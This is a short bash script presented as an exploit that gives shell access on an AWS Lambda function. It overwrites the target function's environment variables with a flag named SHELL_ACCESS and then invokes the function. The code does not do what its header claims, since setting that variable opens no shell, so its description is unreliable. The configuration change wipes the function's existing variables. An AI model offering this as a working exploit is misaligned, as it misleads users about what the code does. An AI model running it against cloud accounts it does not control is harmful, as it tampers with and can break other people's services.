#!/bin/bash
# Exploit AWS Lambda to gain shell access
# Usage: lambda_shell.sh <function_name>

FUNCTION_NAME=$1

if [ -z "$FUNCTION_NAME" ]; then
    echo "Usage: $0 <function_name>"
    exit 1
fi

echo "Gaining shell access on Lambda function: $FUNCTION_NAME"

aws lambda update-function-configuration --function-name $FUNCTION_NAME --environment Variables="{SHELL_ACCESS=true}"
aws lambda invoke --function-name $FUNCTION_NAME out.txt && cat out.txt
